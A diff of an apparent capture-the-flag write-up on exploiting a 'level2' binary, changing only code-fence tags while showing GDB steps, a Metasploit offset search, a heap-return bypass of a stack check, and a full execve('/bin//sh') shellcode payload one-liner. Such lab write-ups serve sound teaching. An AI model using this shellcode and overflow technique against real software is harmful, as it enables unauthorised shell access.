@@ -58,7 +58,7 @@ We will now move on to disassembling and analyzing the binary's functions using 
 
 Using the `info functions` command in GDB, we identify the following symbols defined in the binary:
 
-```
+```gdb
 0x080484d4  p
 0x0804853f  main
 ```
@@ -232,7 +232,7 @@ We will now use GDB to confirm the following:
 
 We begin by setting a breakpoint just before the call to `gets()`:
 
-```bash
+```gdb
 $ gdb ./level2
 (gdb) break *0x080484ed  # call to gets()
 (gdb) run
@@ -265,14 +265,14 @@ This gives us an exact value: **80 bytes** are required to overflow up to EIP.
 
 We can also use Metasploit’s tools to find the offset automatically:
 
-```
+```bash
 $ msf-pattern_create -l
 100Aa0Aa1Aa2Aa3...
 ```
 
 Inject the pattern into the binary:
 
-```
+```gdb
 (gdb) run
 Aa0Aa1Aa2Aa3...
 Program received signal SIGSEGV
@@ -282,7 +282,7 @@ EIP: 0x37634136
 
 Then compute the offset:
 
-```
+```bash
 $ msf-pattern_offset -q 0x37634136
 [*] Exact match at offset 80
 ```
@@ -291,7 +291,7 @@ $ msf-pattern_offset -q 0x37634136
 
 After `gets()` reads our input and we overflow the buffer, the program checks whether the overwritten return address lies in the **stack region**. This is done using the following instructions:
 
-```
+```asm
 mov    0x4(%ebp), %eax
 and    $0xb0000000, %eax
 cmp    $0xb0000000, %eax
@@ -313,7 +313,7 @@ We want to know exactly where `strdup()` copies our input on the heap so we can 
 
 We break right after the call to `strdup()`:
 
-```
+```gdb
 (gdb) break *0x0804853d
 (gdb) continue
 ```
@@ -326,7 +326,7 @@ hello
 
 Once the breakpoint is hit, we inspect the return value of `strdup()` (in EAX):
 
-```
+```gdb
 (gdb) print/x $eax
 $2 = 0x0804a008
 ```
@@ -341,7 +341,7 @@ We’ll now inject the real shellcode and overwrite the return address with this
 
 We use a standard Linux x86 execve shellcode (`execve("/bin//sh")`), which is 28 bytes long. Then we pad with 52 bytes of junk to reach 80 bytes total, and overwrite EIP with the heap address (`0x0804a008`):
 
-```
+```bash
 python -c 'print("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 52 + "\x08\xa0\x04\x08")' > /tmp/exploit
 ```
 
